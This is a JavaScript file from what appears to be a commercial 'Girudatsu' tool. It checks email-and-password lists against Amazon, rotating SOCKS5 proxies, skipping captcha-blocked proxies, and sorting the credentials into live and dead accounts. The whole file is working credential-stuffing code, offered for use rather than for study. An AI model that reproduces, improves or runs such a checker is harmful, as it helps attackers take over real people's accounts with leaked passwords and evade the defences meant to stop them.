/* girudatsu.website
 * Ver.:	1.00
 * File:	amazon.js
 * Date:
 * Desc:	Amazon API. Modified from http://iace.pw/stylecyb/js/acchckver.js
 * Copyright (C) 2015 Girudatsu Team (http://girudatsu.website)
 */


function check(mailpassIndex, proxySocksIndex, numOfFail) {

	if (lstMail["length"] < 1 || lstSock["length"] < 1 || mailpassIndex >= lstMail["length"] || proxySocksIndex >= lstSock["length"]) {
        var time_end = performance.now();
		var exec_time = ((time_end - time_start)/1000/60);
		updateExecutionTime(exec_time.toFixed(2));
	    $('#time_counter').show();
        stopLoading(true);
		return false
	};

	if (numOfFail >= maxFail && noSocks < 1) {
		updateTextBox("", lstSock[proxySocksIndex]);
		proxySocksIndex++;
		check(mailpassIndex, proxySocksIndex, 0);
		return false
	};

	$("#loading").attr ("style", "");
	$("#checkStatus").html ("<b>Account</b>: " + lstMail[mailpassIndex]).effect ("highlight", { color: "#00ff00" }, 1000);
	$("#current_socks").html ("<b>socks</b>: " + lstSock[proxySocksIndex]).effect ("highlight", { color: "#45DFC7" }, 1000);

	var email = $.trim(lstMail[mailpassIndex].split(delim)[0]);
	var password = $.trim(lstMail[mailpassIndex].split(delim)[1]);
    var server = document.getElementById("server").options[document.getElementById("server").selectedIndex].value;
    var tld = document.getElementById("tld").options[document.getElementById("tld").selectedIndex].value;
    var socks5 = lstSock[proxySocksIndex];

	$.ajax ({
        url: SITE_URL,
		dataType: "json",
		type: "GET", // POST | GET
		data: {
			output: 'json',
			email: email,
			password: password,
            server: server,
            tld: tld,
            socks5: socks5
		},
		success: function(jqXHR) {
			if (!jqXHR) {
				stopLoading(true);
				bootbox.dialog ({
					title: "Alert!",
					message: "System Failure Please Contact Admin",
					buttons: {
						success: {
							label: "OK",
							className: "btn-success"
						}
					}
				});
				return false
			};

			switch (jqXHR["code"]) {
				case 0: // LIVE
					updateTextBox(lstMail[mailpassIndex], "");
					$("#tvmit_live").append (jqXHR.msg + "<br />");
                    $("#balance").html (getCookie('Girudatsu_balance'));
                    up("#count_all");up("#count_alls");up("#tvmit_live_count");up("#tvmit_live_counts");
					numOfFail = 0;
					mailpassIndex++;
					updateProgress(mailpassIndex, lstMail["length"]);
					break;
				case 400: // invalid parameter
					stopLoading(false);
					bootbox.dialog ({
						title: "Alert!",
						message: jqXHR["msg"],
						buttons: {
							success: {
								label: "OK",
								className: "btn-success"
							}
						}
					});
					return false;
					break;
				case 2: // DIE
					updateTextBox(lstMail[mailpassIndex], "");
					$("#tvmit_die").append (jqXHR["msg"] + "<br />");
					up("#count_all");up("#count_alls");up("#tvmit_die_count");up("#tvmit_die_counts");
					numOfFail++;
					mailpassIndex++;
					updateProgress(mailpassIndex, lstMail["length"]);
					break;
                case 3: // socks die captcha detect
					updateTextBox(lstMail[mailpassIndex], "");
					updateTextBox("", lstSock[proxySocksIndex]);
					$("#socks-die").append (jqXHR["msg"] + "<br />");
					up(".socks-die");
					mailpassIndex++;
					proxySocksIndex++;
                    break;
				case 4: // Another reason
					updateTextBox("", lstSock[proxySocksIndex]);
					$("#tvmit_unk").append (jqXHR["msg"] + "<br />");
					up("#tvmit_unk_count");up("#count_all");up("#tvmit_unk_counts");
					mailpassIndex++;
					updateProgress(mailpassIndex, lstMail["length"]);
					break;
                default:
					break;
			};
			if (jqXHR["error"] != 1) {
				check(mailpassIndex, proxySocksIndex, numOfFail)
			}
		},
		error: function(jqXHR, jqXHRerror, jqXHRcatchederror) {
			if(jqXHRerror=="error"){stopLoading(false);var alertMessage='';if(jqXHR.status===0){alertMessage='Can\'t connect. Check your network connection';}else if(jqXHR.status==404){alertMessage='Requested page not found. [404]';}else if(jqXHR.status==500){alertMessage='Internal Server Error [500].';}else if(jqXHRerror==='parsererror'){alertMessage='Requested JSON parse failed.';}else if(jqXHRerror==='timeout'){alertMessage='Time out error.';}else if(jqXHRerror==='abort'){alertMessage='Ajax request aborted.';}else{alertMessage='Uncaught Error. '+jqXHR.responseText;}alert("Error! Please try again or contact admin."+"\nStatus Code: "+jqXHR.status+"\nMessage: "+alertMessage+"\nCatched error: "+jqXHRcatchederror);}
		}
	});
	return true
}
